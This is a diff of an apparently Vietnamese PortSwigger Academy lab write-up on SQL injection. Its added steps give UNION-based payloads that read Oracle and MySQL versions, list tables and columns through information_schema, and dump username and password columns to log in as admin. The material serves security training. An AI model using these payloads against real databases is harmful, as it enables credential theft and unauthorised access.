@@ -46,9 +46,29 @@ author: ['default']
 - Tương tự 3.3,thử payload ```'+UNION+SELECT+NULL,username||'~'||password+FROM+users--``` 
 ![image](https://user-images.githubusercontent.com/61643034/209439384-7f5fc4e3-81c4-4312-8821-80c683513ebf.png)
 
- 
  -> Click vào trang login -> nhập username và password và -> done
+ 
+ **[3.5.SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)**
 
+- Thử payload ```'+UNION+SELECT+'a',+NULL+FROM+v$version--``` 
+- Thông tin của Oracle sẽ hiện ra và done!
+
+ **[3.7.SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)**
+
+- Bài này sau 1 hồi nghiên cứu mình phải dùng Repeater của Burpsuite để thực hành
+- Trong gợi ý có payload ```'+UNION+SELECT+@@version,+NULL#``` đây là payload dùng để show version -> sau đó có được version ```'8.0.31-0ubuntu0.20.04.2'``` thì thay ```@@version``` thành version vừa kiếm được. Vậy là xong rồi ^^
+
+**[3.8.SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)**
+
+- Bài này sau 1 hồi nghiên cứu mình phải dùng Repeater của Burpsuite để thực hành
+- Trong gợi ý có payload ```'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--``` đây là payload dùng để show tên các table có trong database, chúng ta sẽ cần nó để tìm tới table chứa ``user `` rồi thấy có 1 table tên là ```users_gwglpg``` rất khả nghi =)))
+- Thử truy xuất dữ liệu xem có gì nào. Sửa pay load lại 1 xíu thành ```'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_gwglpg'--``` -> ta được ```username_jsoxhc``` và ```password_tppahp```
+- Giờ cùng dùng payload cuối nào ```'+UNION+SELECT+username_jsoxhc,+password_tppahp+FROM+users_gwglpg--``` 
+![image](https://user-images.githubusercontent.com/61643034/209443750-96e84f6a-b582-40ce-8796-4383a022bdf8.png)
+
+- Vào ***My Account*** rồi login với tài khoản admin trên là xong =)))
+
+ 
 # [4.SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 ![image](https://user-images.githubusercontent.com/61643034/209040423-3270052e-3a07-4225-9431-70a5c5d6b9cc.png)
 
